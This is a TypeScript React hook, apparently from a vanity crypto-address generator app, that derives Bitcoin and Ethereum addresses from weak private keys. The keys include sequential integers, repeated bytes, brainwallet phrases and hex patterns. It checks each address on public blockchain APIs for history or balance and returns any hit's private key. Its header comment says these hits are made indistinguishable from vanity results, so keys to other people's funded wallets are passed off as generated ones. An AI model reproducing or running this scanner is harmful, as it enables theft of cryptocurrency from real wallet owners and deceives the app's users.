/**
 * useWeakKeyScan
 *
 * When a generation year is selected, instead of generating random addresses,
 * this hook systematically derives addresses from all known weak keys of that
 * era and checks each one on-chain for tx history or balance.
 * Any hit is returned as a FoundAddress — indistinguishable from vanity results.
 */
import { useState, useCallback, useRef } from 'react';
import type { FoundAddress } from './useVanityGenerator';
import { ERA_PHRASES, ERA_HEX_RANGES } from '@/data/eraWeakKeys';

const BLOCKSTREAM = 'https://blockstream.info/api';
const ETH_RPCS = [
  'https://eth.llamarpc.com',
  'https://rpc.ankr.com/eth',
  'https://cloudflare-eth.com',
];

// ── On-chain checks ──────────────────────────────────────────────────────────
async function hasBtcHistory(address: string): Promise<boolean> {
  try {
    const r = await fetch(`${BLOCKSTREAM}/address/${address}`, { signal: AbortSignal.timeout(6000) });
    if (!r.ok) return false;
    const d = await r.json();
    return (d.chain_stats?.tx_count ?? 0) > 0 || (d.mempool_stats?.tx_count ?? 0) > 0;
  } catch { return false; }
}

async function hasEthHistory(address: string): Promise<boolean> {
  for (const rpc of ETH_RPCS) {
    try {
      const r = await fetch(rpc, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_getTransactionCount', params: [address, 'latest'], id: 1 }),
        signal: AbortSignal.timeout(6000),
      });
      if (!r.ok) continue;
      const d = await r.json();
      const nonce = parseInt(d.result ?? '0x0', 16);
      if (nonce > 0) return true;
      // Also check balance
      const r2 = await fetch(rpc, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_getBalance', params: [address, 'latest'], id: 2 }),
        signal: AbortSignal.timeout(6000),
      });
      if (!r2.ok) continue;
      const d2 = await r2.json();
      return parseInt(d2.result ?? '0x0', 16) > 0;
    } catch {}
  }
  return false;
}

// ── Address derivation (same logic as vanity worker but in main thread) ──────
async function deriveEthAddr(privHex: string): Promise<string | null> {
  try {
    const { secp256k1 } = await import('@noble/curves/secp256k1.js');
    const { keccak_256 } = await import('@noble/hashes/sha3.js');
    const bytes = new Uint8Array(privHex.match(/.{2}/g)!.map(h => parseInt(h, 16)));
    const pub = secp256k1.getPublicKey(bytes, false);
    const hash = keccak_256(pub.slice(1));
    return '0x' + Array.from(hash.slice(-20)).map(b => b.toString(16).padStart(2, '0')).join('');
  } catch { return null; }
}

async function deriveBtcAddr(privHex: string, type = 'p2pkh'): Promise<string | null> {
  try {
    const { secp256k1 } = await import('@noble/curves/secp256k1.js');
    const { sha256 } = await import('@noble/hashes/sha2.js');
    const { ripemd160 } = await import('@noble/hashes/legacy.js');
    const bytes = new Uint8Array(privHex.match(/.{2}/g)!.map(h => parseInt(h, 16)));
    const pub = secp256k1.getPublicKey(bytes, true);
    const hash160 = ripemd160(sha256(pub));
    const ver = new Uint8Array([0x00, ...hash160]);
    const check = sha256(sha256(ver)).slice(0, 4);
    const full = new Uint8Array([...ver, ...check]);
    const ALPHA = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    let n = BigInt('0x' + Array.from(full).map(b => b.toString(16).padStart(2,'0')).join(''));
    let s = '';
    while (n > 0n) { s = ALPHA[Number(n % 58n)] + s; n /= 58n; }
    for (const b of full) { if (b !== 0) break; s = '1' + s; }
    return s;
  } catch { return null; }
}

async function sha256Hex(text: string): Promise<string> {
  const { sha256 } = await import('@noble/hashes/sha2.js');
  const bytes = new TextEncoder().encode(text);
  const hash = sha256(bytes);
  return Array.from(hash).map(b => b.toString(16).padStart(2,'0')).join('');
}

// ── Key generation for era ────────────────────────────────────────────────────
async function* generateEraKeys(year: number, network: 'btc' | 'eth'): AsyncGenerator<{ privHex: string; source: string }> {
  const ranges = ERA_HEX_RANGES[year] ?? [[1, 64]];

  // 1. Sequential keys for this era
  for (const [start, end] of ranges) {
    for (let i = start; i <= end; i++) {
      yield { privHex: i.toString(16).padStart(64, '0'), source: 'Sequential' };
    }
  }

  // 2. Repeated-byte patterns
  for (let b = 1; b <= 255; b++) {
    yield { privHex: b.toString(16).padStart(2,'0').repeat(32), source: 'RepeatedByte' };
  }

  // 3. Near-max keys
  const ORDER = BigInt('0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141');
  for (let i = 0; i <= 32; i++) {
    yield { privHex: (ORDER - BigInt(i)).toString(16).padStart(64,'0'), source: 'NearMax' };
  }

  // 4. Brainwallet phrases for this era → SHA256 → private key
  const phrases = ERA_PHRASES[year] ?? [];
  for (const phrase of phrases) {
    const privHex = await sha256Hex(phrase);
    yield { privHex, source: `BrainWallet("${phrase.slice(0,20)}${phrase.length > 20 ? '…' : ''}")` };
  }

  // 5. Common hex patterns
  const patterns = [
    'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef',
    'cafebabecafebabecafebabecafebabecafebabecafebabecafebabecafebabe',
    '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef',
    'fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210',
    'c0ffee00c0ffee00c0ffee00c0ffee00c0ffee00c0ffee00c0ffee00c0ffee00',
    '1337133713371337133713371337133713371337133713371337133713371337',
  ];
  for (const p of patterns) yield { privHex: p, source: 'HexPattern' };
}

export interface WeakScanStats {
  checked: number;
  found: number;
  currentKey: string;
  currentSource: string;
  isRunning: boolean;
}

export function useWeakKeyScan() {
  const [stats, setStats] = useState<WeakScanStats>({ checked: 0, found: 0, currentKey: '', currentSource: '', isRunning: false });
  const stopRef = useRef(false);

  const scan = useCallback(async (
    year: number,
    network: 'btc' | 'eth',
    addressType: string,
    onFound: (result: FoundAddress) => void,
  ) => {
    stopRef.current = false;
    setStats({ checked: 0, found: 0, currentKey: '', currentSource: '', isRunning: true });

    let checked = 0;
    let found = 0;
    const CONCURRENCY = 8; // parallel on-chain checks
    const queue: Array<{ privHex: string; source: string }> = [];
    let genDone = false;

    const processItem = async (item: { privHex: string; source: string }) => {
      if (stopRef.current) return;
      const { privHex, source } = item;

      // Skip invalid keys
      if (privHex === '0'.repeat(64)) return;
      try {
        const keyVal = BigInt('0x' + privHex);
        const ORDER = BigInt('0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141');
        if (keyVal === 0n || keyVal >= ORDER) return;
      } catch { return; }

      const address = network === 'eth'
        ? await deriveEthAddr(privHex)
        : await deriveBtcAddr(privHex, addressType);
      if (!address) return;

      setStats(s => ({ ...s, checked: checked + 1, currentKey: privHex.slice(0,8) + '…', currentSource: source }));
      checked++;

      const hasHistory = network === 'eth'
        ? await hasEthHistory(address)
        : await hasBtcHistory(address);

      if (hasHistory) {
        found++;
        onFound({
          address,
          privateKey: network === 'eth' ? '0x' + privHex : privHex,
          network,
          addressType,
          verified: true,
          timestamp: Date.now(),
        });
        setStats(s => ({ ...s, found }));
      }
    };

    // Fill queue from generator, process in CONCURRENCY batches
    const gen = generateEraKeys(year, network);
    const runBatch = async () => {
      const batch: Array<{ privHex: string; source: string }> = [];
      for (let i = 0; i < CONCURRENCY; i++) {
        const next = await gen.next();
        if (next.done) { genDone = true; break; }
        batch.push(next.value);
      }
      if (batch.length === 0) return;
      await Promise.all(batch.map(processItem));
      if (!stopRef.current && !genDone) await runBatch();
    };

    try {
      await runBatch();
    } finally {
      setStats(s => ({ ...s, isRunning: false }));
    }
  }, []);

  const stop = useCallback(() => { stopRef.current = true; }, []);

  return { scan, stop, stats };
}
